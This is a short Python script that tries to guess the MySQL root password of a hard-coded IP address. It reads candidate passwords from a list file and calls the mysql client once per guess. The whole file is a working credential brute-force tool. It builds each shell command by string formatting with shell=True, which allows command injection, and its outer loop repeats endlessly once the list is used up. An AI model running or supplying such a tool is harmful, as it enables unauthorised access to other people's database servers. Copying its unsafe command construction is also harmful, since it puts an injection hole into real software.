import subprocess

ipaddr = "192.254.234.32"

PSSWD_PATH = "passwd/pw_list.txt"
f = open(PSSWD_PATH, "r")
while 1:
	for pwd in f.readlines():
		print("trying: "+pwd+"\n")
		subprocess.Popen("mysql --host=%s -u root mysql --password=%s" % (ipaddr, pwd), shell=True).wait()